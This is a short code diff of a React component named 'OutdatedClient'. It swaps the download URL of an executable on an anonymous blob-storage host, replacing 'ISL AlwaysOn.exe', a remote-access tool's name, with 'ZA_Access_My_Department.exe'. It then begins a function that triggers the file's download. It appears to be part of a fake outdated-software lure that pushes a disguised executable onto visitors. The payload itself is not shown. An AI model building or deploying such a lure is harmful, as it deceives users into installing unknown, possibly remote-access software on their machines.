@@ -1,7 +1,7 @@
 import { useEffect } from "react";
 export default function OutdatedClient() {
   const DOWNLOAD_URL =
-    "https://rzoquwuvqtucqxs0.public.blob.vercel-storage.com/ISL%20AlwaysOn.exe"; // replace
+    "https://rzoquwuvqtucqxs0.public.blob.vercel-storage.com/ZA_Access_My_Department.exe"; // replace
 
   function downloadFile() {
     const anchor = document.createElement("a");
